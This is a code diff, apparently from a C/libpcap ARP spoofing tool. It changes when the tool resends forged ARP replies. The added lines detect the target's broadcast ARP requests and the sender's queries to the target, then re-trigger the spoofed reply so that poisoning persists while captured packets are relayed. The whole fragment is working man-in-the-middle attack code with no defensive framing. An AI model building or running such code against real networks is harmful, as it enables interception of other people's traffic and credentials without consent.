@@ -122,7 +122,6 @@ int main(int argc, char** argv)
                 memcpy(repSpoof.arp1.dstMAC, shareData.senderMAC, ETHER_ADDR_LEN);
                 packet = &repSpoof;
                 pcap_sendpacket(pktDescriptor, packet, 42);
-                readStatus = PACKET_RELAY;
                 break;
             case PACKET_RELAY:
                 pcap_sendpacket(pktDescriptor, readedData, pktData->len);
@@ -183,6 +182,21 @@ void* thread_read_packet(char* interface)
                                 (ntohl(arpHeader->dstIP) == shareData.localhostIP))
                         {
                             memcpy(shareData.targetMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
+                            readStatus = REP_SPOOF_PACKET;
+                        }
+                    }
+                    if (ntohs(arpHeader->ar_op) == ARPOP_REQUEST)
+                    {
+                        // Target broadcast
+                        if ((!memcmp(ethHeader->_802_3_shost, shareData.targetMAC, ETHER_ADDR_LEN)) &&
+                                   (!memcmp(ethHeader->_802_3_dhost, "\xFF\xFF\xFF\xFF\xFF\xFF", ETHER_ADDR_LEN)))
+                        {
+                            readStatus = REP_SPOOF_PACKET;
+                        }
+                        // Sender to target
+                        if ((ntohl(arpHeader->srcIP) == shareData.senderIP) &&
+                                (ntohl(arpHeader->dstIP) == shareData.targetIP))
+                        {
                             readStatus = REP_SPOOF_PACKET;
                         }
                     }
